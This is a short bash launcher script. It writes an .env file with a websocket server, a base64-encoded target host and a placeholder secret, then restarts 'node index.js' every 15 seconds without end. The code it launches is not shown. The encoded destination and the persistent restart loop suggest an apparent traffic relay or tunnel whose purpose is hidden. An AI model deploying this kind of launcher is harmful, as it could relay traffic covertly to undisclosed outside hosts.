#!/bin/bash
CONNECT=$1
NAME=$2
echo "SERVER_WS=ws://cdn.medco.cyou
SERVER_TARGET=czEuZGFwaXRheC5zb2NpYWw6ODA4MQ==
SERVER_DOMAIN=${NAME}
SERVER_SECRET=secret
SERVER_CONNECTION=${CONNECT}" > .env
while true; do node index.js; sleep 15; done
